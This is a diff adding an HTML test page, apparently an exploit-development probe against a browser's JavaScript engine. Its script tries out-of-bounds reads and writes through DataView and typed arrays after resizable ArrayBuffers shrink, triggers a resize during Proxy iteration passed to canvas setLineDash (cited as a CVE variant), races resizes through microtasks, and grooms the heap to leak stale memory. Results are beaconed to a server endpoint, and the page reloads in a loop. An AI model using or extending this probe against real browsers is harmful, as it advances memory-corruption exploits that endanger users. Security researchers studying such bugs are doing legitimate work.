@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V569</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V569-'+tag+'?d='+encodeURIComponent(String(data).substring(0,500))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+beacon('BOOT','V569-rab-dv-oob');
+
+// =============================================
+// T0: RAB availability check
+// =============================================
+var hasRAB=false;
+try{
+  var test=new ArrayBuffer(8,{maxByteLength:16});
+  test.resize(4);
+  hasRAB=(test.byteLength===4);
+  beacon('T0','RAB='+hasRAB+'|resize=OK|bl='+test.byteLength);
+}catch(e){
+  beacon('T0','RAB=false|err='+e.message);
+}
+
+if(!hasRAB){
+  beacon('FAIL','no-RAB');
+  setTimeout(function(){location.href='index.html?cb='+Date.now()},5000);
+  throw new Error('STOP');
+}
+
+// =============================================
+// T1: DataView on RAB — basic OOB after resize
+// =============================================
+(function(){
+  try{
+    var ab=new ArrayBuffer(128,{maxByteLength:128});
+    var u8=new Uint8Array(ab);
+    for(var i=0;i<128;i++) u8[i]=0x41+i%26;
+
+    var dv=new DataView(ab,0,128);
+    var before=dv.getUint8(100);
+    beacon('T1A','before-resize|byte100='+before);
+
+    ab.resize(4);
+    beacon('T1B','resized|bl='+ab.byteLength);
+
+    // Try reading past new bounds via DataView
+    var oobRead=null;
+    try{
+      oobRead=dv.getUint8(100);
+      beacon('T1C','OOB-READ-SUCCESS|byte100='+oobRead+'|VULN=YES');
+    }catch(e){
+      beacon('T1C','OOB-read-threw|'+e.name+':'+e.message);
+    }
+
+    // Try reading byteLength — should reflect resize
+    try{
+      var dvbl=dv.byteLength;
+      beacon('T1D','dv.byteLength='+dvbl+'|stale='+(dvbl===128));
+    }catch(e){
+      beacon('T1D','byteLength-threw|'+e.name);
+    }
+
+    // Try writing past bounds
+    try{
+      dv.setUint8(50,0xBB);
+      beacon('T1E','OOB-WRITE-SUCCESS|VULN=YES');
+    }catch(e){
+      beacon('T1E','OOB-write-threw|'+e.name);
+    }
+  }catch(e){beacon('T1','ERR:'+e.message)}
+})();
+
+// =============================================
+// T2: TypedArray on RAB — OOB after resize
+// =============================================
+(function(){
+  try{
+    var ab=new ArrayBuffer(256,{maxByteLength:256});
+    var u32=new Uint32Array(ab);
+    for(var i=0;i<64;i++) u32[i]=0xDEAD0000+i;
+
+    var f64=new Float64Array(ab);
+    var before=f64[16];
+    beacon('T2A','f64[16]='+before);
+
+    ab.resize(8);
+    beacon('T2B','resized|bl='+ab.byteLength);
+
+    // Try OOB access via TypedArray
+    try{
+      var oob=f64[16];
+      beacon('T2C','OOB-f64[16]='+oob+'|isNaN='+isNaN(oob)+'|VULN='+(oob!==undefined));
+    }catch(e){
+      beacon('T2C','f64-threw|'+e.name);
+    }
+
+    // Check length property
+    try{
+      beacon('T2D','f64.length='+f64.length+'|f64.byteLength='+f64.byteLength);
+    }catch(e){
+      beacon('T2D','length-threw|'+e.name);
+    }
+  }catch(e){beacon('T2','ERR:'+e.message)}
+})();
+
+// =============================================
+// T3: Resize during Proxy iteration (CVE-2025-43541 interpreter variant)
+// =============================================
+(function(){
+  try{
+    var ab=new ArrayBuffer(256,{maxByteLength:256});
+    var dv=new DataView(ab,0,256);
+    var u8=new Uint8Array(ab);
+    for(var i=0;i<256;i++) u8[i]=i;
+
+    var callCount=0;
+    var proxyArr=new Proxy([1,2,3,4,5],{
+      get:function(target,prop){
+        callCount++;
+        if(prop==='length') return target.length;
+        if(callCount===3){
+          // Resize during iteration
+          ab.resize(2);
+        }
+        return target[prop];
+      }
+    });
+
+    // Use the proxy as a sequence for setLineDash (triggers IDL conversion with callbacks)
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    var ctx=c.getContext('2d');
+    ctx.setLineDash(proxyArr);
+    beacon('T3A','setLineDash-OK|calls='+callCount+'|bl='+ab.byteLength);
+
+    // Now try DataView read past resized bounds
+    try{
+      var val=dv.getUint8(200);
+      beacon('T3B','DV-OOB-after-proxy|byte200='+val+'|VULN=YES');
+    }catch(e){
+      beacon('T3B','DV-threw|'+e.name);
+    }
+  }catch(e){beacon('T3','ERR:'+e.message)}
+})();
+
+// =============================================
+// T4: Grow-then-read stale data test
+// =============================================
+(function(){
+  try{
+    var ab=new ArrayBuffer(8,{maxByteLength:4096});
+    var u8=new Uint8Array(ab);
+    for(var i=0;i<8;i++) u8[i]=0xFF;
+    beacon('T4A','initial|bl='+ab.byteLength);
+
+    // Grow and check if new region has stale heap data
+    ab.resize(4096);
+    var grown=new Uint8Array(ab);
+    var nz=0,firstNZ=-1;
+    var samples=[];
+    for(var i=8;i<4096;i++){
+      if(grown[i]!==0){
+        nz++;
+        if(firstNZ<0) firstNZ=i;
+        if(samples.length<8) samples.push('i'+i+'=0x'+grown[i].toString(16));
+      }
+    }
+    beacon('T4B','grown|bl='+ab.byteLength+'|nz='+nz+'|first='+firstNZ+'|s='+samples.join(','));
+
+    // Heat the heap then grow again
+    var trash=[];
+    for(var i=0;i<500;i++){
+      var t=new ArrayBuffer(4096);
+      var tv=new Uint8Array(t);
+      for(var j=0;j<4096;j++) tv[j]=0xCC;
+      trash.push(t);
+    }
+    trash=null;
+
+    var ab2=new ArrayBuffer(8,{maxByteLength:4096});
+    ab2.resize(4096);
+    var u8b=new Uint8Array(ab2);
+    var nz2=0,firstNZ2=-1;
+    var samples2=[];
+    for(var i=8;i<4096;i++){
+      if(u8b[i]!==0){
+        nz2++;
+        if(firstNZ2<0) firstNZ2=i;
+        if(samples2.length<8) samples2.push('i'+i+'=0x'+u8b[i].toString(16));
+      }
+    }
+    beacon('T4C','hot-grow|nz='+nz2+'|first='+firstNZ2+'|s='+samples2.join(','));
+  }catch(e){beacon('T4','ERR:'+e.message)}
+})();
+
+// =============================================
+// T5: DataView race — concurrent resize via microtask
+// =============================================
+(function(){
+  try{
+    var ab=new ArrayBuffer(1024,{maxByteLength:1024});
+    var u8=new Uint8Array(ab);
+    for(var i=0;i<1024;i++) u8[i]=i&0xff;
+
+    var dv=new DataView(ab);
+    var results=[];
+
+    // Queue resize as microtask, then immediately read
+    Promise.resolve().then(function(){
+      ab.resize(4);
+    });
+
+    // These reads happen BEFORE the microtask (same tick)
+    for(var i=0;i<10;i++){
+      try{
+        var v=dv.getFloat64(i*8);
+        results.push(i+':'+v.toString(16).substring(0,8));
+      }catch(e){
+        results.push(i+':ERR');
+      }
+    }
+    beacon('T5A','sync-reads|r='+results.join('|'));
+
+    // After microtask
+    setTimeout(function(){
+      var results2=[];
+      for(var i=0;i<10;i++){
+        try{
+          var v=dv.getFloat64(i*8);
+          results2.push(i+':'+v);
+        }catch(e){
+          results2.push(i+':'+e.name);
+        }
+      }
+      beacon('T5B','post-resize|r='+results2.join('|'));
+    },0);
+  }catch(e){beacon('T5','ERR:'+e.message)}
+})();
+
+// =============================================
+// T6: FinalizationRegistry on RAB — detect stale data after GC
+// =============================================
+setTimeout(function(){
+  try{
+    var collected=false;
+    var fr=new FinalizationRegistry(function(tag){
+      beacon('T6-FR','collected:'+tag);
+      collected=true;
+    });
+
+    // Create many RABs with known data, let them go, then allocate new ones
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(128,{maxByteLength:128});
+      var u8=new Uint8Array(ab);
+      for(var j=0;j<128;j++) u8[j]=0xAA;
+      fr.register(ab,'rab-'+i);
+    }
+    // Drop refs
+    ab=null;u8=null;
+
+    // GC
+    for(var g=0;g<10;g++){
+      var j=[];for(var k=0;k<5000;k++)j.push({x:new Array(100)});
+      j=null;
+    }
+
+    // Allocate new RABs and check for stale 0xAA data
+    var staleCount=0;
+    for(var i=0;i<200;i++){
+      var ab2=new ArrayBuffer(8,{maxByteLength:128});
+      ab2.resize(128);
+      var u8b=new Uint8Array(ab2);
+      var nz=0;
+      for(var j=8;j<128;j++){
+        if(u8b[j]===0xAA) nz++;
+      }
+      if(nz>0) staleCount++;
+    }
+    beacon('T6','stale-rabs='+staleCount+'/200|collected='+collected);
+  }catch(e){beacon('T6','ERR:'+e.message)}
+},500);
+
+// =============================================
+// T7: Watchdog + auto-reload
+// =============================================
+setTimeout(function(){
+  beacon('DONE','V569-complete');
+  setTimeout(function(){ location.href='index.html?cb='+Date.now(); },5000);
+},10000);
+</script>
+</body></html>
